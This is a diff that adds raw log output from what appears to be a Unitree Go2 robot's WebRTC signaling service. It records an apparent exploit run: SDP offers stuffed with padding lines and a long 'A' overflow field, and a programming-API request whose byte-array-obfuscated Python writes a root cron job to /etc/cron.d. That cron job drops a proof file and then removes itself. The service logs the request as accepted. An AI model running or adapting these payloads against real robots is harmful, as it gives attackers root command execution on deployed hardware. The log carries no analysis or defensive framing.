host\r\r\na=pad000:x\r\na=pad001:x\r\na=pad002:x\r\na=pad003:x\r\na=pad004:x\r\na=pad005:x\r\na=pad006:x\r\na=pad007:x\r\na=pad008:x\r\na=pad009:x\r\na=pad010:x\r\na=pad011:x\r\na=pad012:x\r\na=pad013:x\r\na=pad014:x\r\na=pad015:x\r\na=pad016:x\r\na=pad017:x\r\na=pad018:x\r\na=pad019:x\r\na=pad020:x\r\na=pad021:x\r\na=pad022:x\r\na=pad023:x\r\na=pad024:x\r\na=pad025:x\r\na=pad026:x\r\na=pad027:x\r\na=pad028:x\r\na=pad029:x\r\na=pad030:x\r\na=pad031:x\r\na=pad032:x\r\na=pad033:x\r\na=pad034:x\r\na=pad035:x\r\na=pad036:x\r\na=pad037:x\r\na=pad038:x\r\na=pad039:x\r\na=pad040:x\r\na=pad041:x\r\na=pad042:x\r\na=pad043:x\r\na=pad044:x\r\na=pad045:x\r\na=pad046:x\r\na=pad047:x\r\na=pad048:x\r\na=pad049:x\r\na=pad050:x\r\na=pad051:x\r\na=pad052:x\r\na=pad053:x\r\na=pad054:x\r\na=pad055:x\r\na=pad056:x\r\na=pad057:x\r\na=pad058:x\r\na=pad059:x\r\na=pad060:x\r\na=pad061:x\r\na=pad062:x\r\na=pad063:x\r\na=pad064:x\r\na=pad065:x\r\na=pad066:x\r\na=pad067:x\r\na=pad068:x\r\na=pad069:x\r\na=pad070:x\r\na=pad071:x\r\na=pad072:x\r\na=pad073:x\r\na=pad074:x\r\na=pad075:x\r\na=pad076:x\r\na=pad077:x\r\na=pad078:x\r\na=pad079:x\r\na=pad080:x\r\na=pad081:x\r\na=pad082:x\r\na=pad083:x\r\na=pad084:x\r\na=pad085:x\r\na=pad086:x\r\na=pad087:x\r\na=pad088:x\r\na=pad089:x\r\na=pad090:x\r\na=pad091:x\r\na=pad092:x\r\na=pad093:x\r\na=pad094:x\r\na=pad095:x\r\na=pad096:x\r\na=pad097:x\r\na=pad098:x\r\na=pad099:x\r\na=pad100:x\r\na=pad101:x\r\na=pad102:x\r\na=pad103:x\r\na=pad104:x\r\na=pad105:x\r\na=pad106:x\r\na=pad107:x\r\na=pad108:x\r\na=pad109:x\r\na=pad110:x\r\na=pad111:x\r\na=pad112:x\r\na=pad113:x\r\na=pad114:x\r\na=pad115:x\r\na=pad116:x\r\na=pad117:x\r\na=pad118:x\r\na=pad119:x\r\na=pad120:x\r\na=pad121:x\r\na=pad122:x\r\na=pad123:x\r\na=pad124:x\r\na=pad125:x\r\na=pad126:x\r\na=pad127:x\r\na=pad128:x\r\na=pad129:x\r\na=pad130:x\r\na=pad131:x\r\na=pad132:x\r\na=pad133:x\r\na=pad134:x\r\na=pad135:x\r\na=pad136:x\r\na=pad137:x\r\na=pad138:x\r\na=pad139:x\r\na=pad140:x\r\na=pad141:x\r\na=pad142:x\r\na=pad143:x\r\na=pad144:x\r\na=pad145:x\r\na=pad146:x\r\na=pad147:x\r\na=pad148:x\r\na=pad149:x\r\na=pad150:x\r\na=pad151:x\r\na=pad152:x\r\na=pad153:x\r\na=pad154:x\r\na=pad155:x\r\na=pad156:x\r\na=pad157:x\r\na=pad158:x\r\na=pad159:x\r\na=pad160:x\r\na=pad161:x\r\na=pad162:x\r\na=pad163:x\r\na=pad164:x\r\na=pad165:x\r\na=pad166:x\r\na=pad167:x\r\na=pad168:x\r\na=pad169:x\r\na=pad170:x\r\na=pad171:x\r\na=pad172:x\r\na=pad173:x\r\na=pad174:x\r\na=pad175:x\r\na=pad176:x\r\na=pad177:x\r\na=pad178:x\r\na=pad179:x\r\na=pad180:x\r\na=pad181:x\r\na=pad182:x\r\na=pad183:x\r\na=pad184:x\r\na=pad185:x\r\na=pad186:x\r\na=pad187:x\r\na=pad188:x\r\na=pad189:x\r\na=pad190:x\r\na=pad191:x\r\na=pad192:x\r\na=pad193:x\r\na=pad194:x\r\na=pad195:x\r\na=pad196:x\r\na=pad197:x\r\na=pad198:x\r\na=pad199:x\r\na=pad200:x\r\na=pad201:x\r\na=pad202:x\r\na=pad203:x\r\na=pad204:x\r\na=pad205:x\r\na=pad206:x\r\na=pad207:x\r\na=pad208:x\r\na=pad209:x\r\na=pad210:x\r\na=pad211:x\r\na=pad212:x\r\na=pad213:x\r\na=pad214:x\r\na=pad215:x\r\na=pad216:x\r\na=pad217:x\r\na=pad218:x\r\na=pad219:x\r\na=pad220:x\r\na=pad221:x\r\na=pad222:x\r\na=pad223:x\r\na=pad224:x\r\na=pad225:x\r\na=pad226:x\r\na=pad227:x\r\na=pad228:x\r\na=pad229:x\r\na=pad230:x\r\na=pad231:x\r\na=pad232:x\r\na=pad233:x\r\na=pad234:x\r\na=pad235:x\r\na=pad236:x\r\na=pad237:x\r\na=pad238:x\r\na=pad239:x\r\na=pad240:x\r\na=pad241:x\r\na=pad242:x\r\na=pad243:x\r\na=pad244:x\r\na=pad245:x\r\na=pad246:x\r\na=pad247:x\r\na=pad248:x\r\na=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:overflow\r\n","id":"STA_localNetwork","type":"offer","token":""}
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:341]: hasConnectedSession() trigger
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1636]: isOfferContainTurnServer() offer not contain turnserver 
+
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1792]: offerReceived() offer not contain turnserver info!
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1795]: offerReceived() offer check passed!
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1808]: offerReceived() length: 5234
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1831]: offerReceived() check point 1
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1838]: offerReceived() check point 2
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1850]: offerReceived() before getTurnServerInfo!
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1852]: offerReceived() after getTurnServerInfo!
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:604]: createStreamingSession() enter
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:646]: createStreamingSession() CP 1
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:476]: initializePeerConnection() enter
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:477]: initializePeerConnection() CP 1
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:544]: initializePeerConnection() CP 2
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:558]: initializePeerConnection() CP 3
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:563]: initializePeerConnection() exit
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:654]: createStreamingSession() CP 2
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:668]: createStreamingSession() CP 3
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:682]: createStreamingSession() CP 4
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:710]: createStreamingSession() exit
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1855]: offerReceived() after createStreamingSession
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1858]: offerReceived() after getSignalSourceType
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1863]: offerReceived() after determineSessionNetworkMode
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1746]: getOfferToken() before cJSON_GetObjectItem token
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1752]: getOfferToken() after cJSON_GetObjectItem token
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1867]: offerReceived() after parse offer token
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1911]: offerReceived() exit
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:63]: connection state change to [RTC_PEER_CONNECTION_STATE_CONNECTING]
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:98]: [ICE] ICE checking (连通性检查)中, peer: client1715918518
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:446]: [ICE] Gathering candidate: {"candidate":"candidate:1 1 udp 2130706431 169.254.107.33 48278 typ host raddr 0.0.0.0 rport 0 generation 0 network-cost 999","sdpMid":"0","sdpMLineIndex":0}
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:446]: [ICE] Gathering candidate: {"candidate":"candidate:0 1 udp 2130706431 192.168.123.161 37818 typ host raddr 0.0.0.0 rport 0 generation 0 network-cost 999","sdpMid":"0","sdpMLineIndex":0}
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:458]: [ICE] Candidate gathering finished for peer: client1715918518
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:211]: webrtcConnectionAnswer() trigger
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:234]: webrtcConnectionAnswer() coming_topic = rt/webrtcreq, use webrtc_res_writer
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:15]: do_webrtc_req_take() trigger
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:66]: connection state change to [RTC_PEER_CONNECTION_STATE_CONNECTED]
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:249]: logSelectedIceCandidatesInformation() sessionOnTurnServer set to 0
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:535]: onSctpSessionDataChannelOpen() enter
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1475]: tryToIdentifyInterface() enter
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1490]: tryToIdentifyInterface() addr=560725673
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1491]: tryToIdentifyInterface() port=38588
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1508]: tryToIdentifyInterface() found target interface, interface_NAME=eth0
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2261]: [PUBNET] dataChannelOnOpenCallback() rtc_peer_conn->interface_NAME=eth0 
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2271]: [PUBNET] dataChannelOnOpenCallback() pConfiguration->publicNetworkStatus set to Undefined
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2194]: [PUBNET] doInterfacePacketStatisticsThreadFunction enter
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2194]: [PUBNET] doInterfacePacketStatisticsThreadFunction enter
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:140]: dataChannelOnMessageCallback() incoming message = {"type":"req","topic":"rt/api/programming_actuator/request","data":{"header":{"identity":{"id":73458505,"api_id":1002}},"parameter":"{\"program_content\": {\"chunk_index\": 1, \"total_chunk_num\": 1, \"chunk_content\": \"_p = str(bytes([47, 101, 116, 99, 47, 99, 114, 111, 110, 46, 100, 47, 117]), 'utf-8')\\n_e = str(bytes([42, 32, 42, 32, 42, 32, 42, 32, 42, 32, 114, 111, 111, 116, 32, 101, 99, 104, 111, 32, 115, 100, 112, 95, 111, 118, 101, 114, 102, 108, 111, 119, 95, 112, 114, 111, 111, 102, 95, 49, 55, 56, 48, 51, 51, 55, 51, 57, 56, 32, 62, 32, 47, 116, 109, 112, 47, 117, 110, 108, 101, 97, 115, 104, 95, 112, 114, 111, 111, 102, 46, 116, 120, 116, 32, 38, 38, 32, 114, 109, 32, 45, 102, 32, 47, 101, 116, 99, 47, 99, 114, 111, 110, 46, 100, 47, 117]), 'utf-8')\\n_d = np.array([_e])\\nnp.savetxt(_p, _d, fmt='%s')\"}, \"program_uuid\": \"1780337398\", \"bind_hotkey\": \"L1+Y\"}"}}
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:148]: dataChannelOnMessageCallback() incoming topic = rt/api/programming_actuator/request
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:185]: dataChannelOnMessageCallback() request ident id=73458505
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher/request.h:46]: write_request() req.header.policy.priority=0, req.header.policy.noreply=0 
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber/response.h:78]: do_response_data_take() topic=rt/api/programming_actuator/response, sendOnDataChannel msg_len=152
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:75]: connection state change to [RTC_PEER_CONNECTION_STATE_CLOSED]
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:195]: !!! OnSessionClosed() pConfiguration->streamingSessionCount=1
+tcpdump: listening on wlan0, link-type EN10MB (Ethernet), capture size 262144 bytes
+tcpdump: wwan0: No such device exists
+(SIOCGIFHWADDR: No such device)
+tcpdump: /tmp/wwan0_1715918519_captrue.pcap: No such file or directory
+[2024-05-17 12:01:59 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2241]: [PUBNET] Interface:wwan0, Number of lines: 0
+0 packets captured
+1 packet received by filter
+0 packets dropped by kernel
+reading from file /tmp/wlan0_1715918519_captrue.pcap, link-type EN10MB (Ethernet)
+[2024-05-17 12:02:02 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2241]: [PUBNET] Interface:wlan0, Number of lines: 0
+[2024-05-17 12:02:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:02:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:02:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:03:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:03:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:15]: do_webrtc_req_take() trigger
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1768]: offerReceived() receive offer, offer_len is 5234
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1769]: offerReceived() receive offer, offer_content is {"sdp":"v=0\r\no=- 3456789012 1 IN IP4 0.0.0.0\r\ns=-\r\nt=0 0\r\na=fingerprint:sha-256 4A:AD:B9:B1:3C:82:CB:D4:8D:4F:40:58:5C:C8:49:71:19:F4:B6:B1:34:71:22:B5:36:9B:8F:D2:3E:AA:33:53\r\na=group:BUNDLE 0 1 2 3 4\r\nm=fingerprint\r\ni=sha-256 BB:6A:E2:FF:5C:6D:59:A9:0D:CF:D6:CA:6A:97:F0:54:BF:DE:86:BC:91:22:10:E7:63:64:E7:45:4E:85:D4:6E\r\nc=IN IP4 0.0.0.0\r\na=ice-ufrag:rNxy\r\na=ice-pwd:xDJodvFqWKMuQfsGdbKs8D\r\na=setup:actpass\r\na=mid:0\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:rNxy\r\na=ice-pwd:xDJodvFqWKMuQfsGdbKs8D\r\na=mid:1\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:rNxy\r\na=ice-pwd:xDJodvFqWKMuQfsGdbKs8D\r\na=mid:2\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:rNxy\r\na=ice-pwd:xDJodvFqWKMuQfsGdbKs8D\r\na=mid:3\r\nm=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\na=ice-ufrag:rNxy\r\na=ice-pwd:xDJodvFqWKMuQfsGdbKs8D\r\na=mid:4\r\na=candidate:b06876595f855fe0ce5212e1b302209c 1 udp 2130706431 192.168.1.233 62525 typ host\r\r\na=candidate:f5a9be8b49d027a84cd23cab8db3a9af 1 udp 2130706431 100.64.113.47 53599 typ host\r\r\na=candidate:edeb15bd8d3f0dbec18897b0ffdb6515 1 udp 2130706431 192.168.123.100 63690 typ host\r\r\na=pad000:x\r\na=pad001:x\r\na=pad002:x\r\na=pad003:x\r\na=pad004:x\r\na=pad005:x\r\na=pad006:x\r\na=pad007:x\r\na=pad008:x\r\na=pad009:x\r\na=pad010:x\r\na=pad011:x\r\na=pad012:x\r\na=pad013:x\r\na=pad014:x\r\na=pad015:x\r\na=pad016:x\r\na=pad017:x\r\na=pad018:x\r\na=pad019:x\r\na=pad020:x\r\na=pad021:x\r\na=pad022:x\r\na=pad023:x\r\na=pad024:x\r\na=pad025:x\r\na=pad026:x\r\na=pad027:x\r\na=pad028:x\r\na=pad029:x\r\na=pad030:x\r\na=pad031:x\r\na=pad032:x\r\na=pad033:x\r\na=pad034:x\r\na=pad035:x\r\na=pad036:x\r\na=pad037:x\r\na=pad038:x\r\na=pad039:x\r\na=pad040:x\r\na=pad041:x\r\na=pad042:x\r\na=pad043:x\r\na=pad044:x\r\na=pad045:x\r\na=pad046:x\r\na=pad047:x\r\na=pad048:x\r\na=pad049:x\r\na=pad050:x\r\na=pad051:x\r\na=pad052:x\r\na=pad053:x\r\na=pad054:x\r\na=pad055:x\r\na=pad056:x\r\na=pad057:x\r\na=pad058:x\r\na=pad059:x\r\na=pad060:x\r\na=pad061:x\r\na=pad062:x\r\na=pad063:x\r\na=pad064:x\r\na=pad065:x\r\na=pad066:x\r\na=pad067:x\r\na=pad068:x\r\na=pad069:x\r\na=pad070:x\r\na=pad071:x\r\na=pad072:x\r\na=pad073:x\r\na=pad074:x\r\na=pad075:x\r\na=pad076:x\r\na=pad077:x\r\na=pad078:x\r\na=pad079:x\r\na=pad080:x\r\na=pad081:x\r\na=pad082:x\r\na=pad083:x\r\na=pad084:x\r\na=pad085:x\r\na=pad086:x\r\na=pad087:x\r\na=pad088:x\r\na=pad089:x\r\na=pad090:x\r\na=pad091:x\r\na=pad092:x\r\na=pad093:x\r\na=pad094:x\r\na=pad095:x\r\na=pad096:x\r\na=pad097:x\r\na=pad098:x\r\na=pad099:x\r\na=pad100:x\r\na=pad101:x\r\na=pad102:x\r\na=pad103:x\r\na=pad104:x\r\na=pad105:x\r\na=pad106:x\r\na=pad107:x\r\na=pad108:x\r\na=pad109:x\r\na=pad110:x\r\na=pad111:x\r\na=pad112:x\r\na=pad113:x\r\na=pad114:x\r\na=pad115:x\r\na=pad116:x\r\na=pad117:x\r\na=pad118:x\r\na=pad119:x\r\na=pad120:x\r\na=pad121:x\r\na=pad122:x\r\na=pad123:x\r\na=pad124:x\r\na=pad125:x\r\na=pad126:x\r\na=pad127:x\r\na=pad128:x\r\na=pad129:x\r\na=pad130:x\r\na=pad131:x\r\na=pad132:x\r\na=pad133:x\r\na=pad134:x\r\na=pad135:x\r\na=pad136:x\r\na=pad137:x\r\na=pad138:x\r\na=pad139:x\r\na=pad140:x\r\na=pad141:x\r\na=pad142:x\r\na=pad143:x\r\na=pad144:x\r\na=pad145:x\r\na=pad146:x\r\na=pad147:x\r\na=pad148:x\r\na=pad149:x\r\na=pad150:x\r\na=pad151:x\r\na=pad152:x\r\na=pad153:x\r\na=pad154:x\r\na=pad155:x\r\na=pad156:x\r\na=pad157:x\r\na=pad158:x\r\na=pad159:x\r\na=pad160:x\r\na=pad161:x\r\na=pad162:x\r\na=pad163:x\r\na=pad164:x\r\na=pad165:x\r\na=pad166:x\r\na=pad167:x\r\na=pad168:x\r\na=pad169:x\r\na=pad170:x\r\na=pad171:x\r\na=pad172:x\r\na=pad173:x\r\na=pad174:x\r\na=pad175:x\r\na=pad176:x\r\na=pad177:x\r\na=pad178:x\r\na=pad179:x\r\na=pad180:x\r\na=pad181:x\r\na=pad182:x\r\na=pad183:x\r\na=pad184:x\r\na=pad185:x\r\na=pad186:x\r\na=pad187:x\r\na=pad188:x\r\na=pad189:x\r\na=pad190:x\r\na=pad191:x\r\na=pad192:x\r\na=pad193:x\r\na=pad194:x\r\na=pad195:x\r\na=pad196:x\r\na=pad197:x\r\na=pad198:x\r\na=pad199:x\r\na=pad200:x\r\na=pad201:x\r\na=pad202:x\r\na=pad203:x\r\na=pad204:x\r\na=pad205:x\r\na=pad206:x\r\na=pad207:x\r\na=pad208:x\r\na=pad209:x\r\na=pad210:x\r\na=pad211:x\r\na=pad212:x\r\na=pad213:x\r\na=pad214:x\r\na=pad215:x\r\na=pad216:x\r\na=pad217:x\r\na=pad218:x\r\na=pad219:x\r\na=pad220:x\r\na=pad221:x\r\na=pad222:x\r\na=pad223:x\r\na=pad224:x\r\na=pad225:x\r\na=pad226:x\r\na=pad227:x\r\na=pad228:x\r\na=pad229:x\r\na=pad230:x\r\na=pad231:x\r\na=pad232:x\r\na=pad233:x\r\na=pad234:x\r\na=pad235:x\r\na=pad236:x\r\na=pad237:x\r\na=pad238:x\r\na=pad239:x\r\na=pad240:x\r\na=pad241:x\r\na=pad242:x\r\na=pad243:x\r\na=pad244:x\r\na=pad245:x\r\na=pad246:x\r\na=pad247:x\r\na=pad248:x\r\na=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:overflow\r\n","id":"STA_localNetwork","type":"offer","token":""}
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:341]: hasConnectedSession() trigger
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1636]: isOfferContainTurnServer() offer not contain turnserver 
+
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1792]: offerReceived() offer not contain turnserver info!
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1795]: offerReceived() offer check passed!
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1808]: offerReceived() length: 5234
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1831]: offerReceived() check point 1
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1838]: offerReceived() check point 2
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1850]: offerReceived() before getTurnServerInfo!
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1852]: offerReceived() after getTurnServerInfo!
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:604]: createStreamingSession() enter
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:646]: createStreamingSession() CP 1
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:476]: initializePeerConnection() enter
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:477]: initializePeerConnection() CP 1
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:544]: initializePeerConnection() CP 2
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:558]: initializePeerConnection() CP 3
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:563]: initializePeerConnection() exit
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:654]: createStreamingSession() CP 2
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:668]: createStreamingSession() CP 3
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:682]: createStreamingSession() CP 4
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:710]: createStreamingSession() exit
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1855]: offerReceived() after createStreamingSession
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1858]: offerReceived() after getSignalSourceType
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1863]: offerReceived() after determineSessionNetworkMode
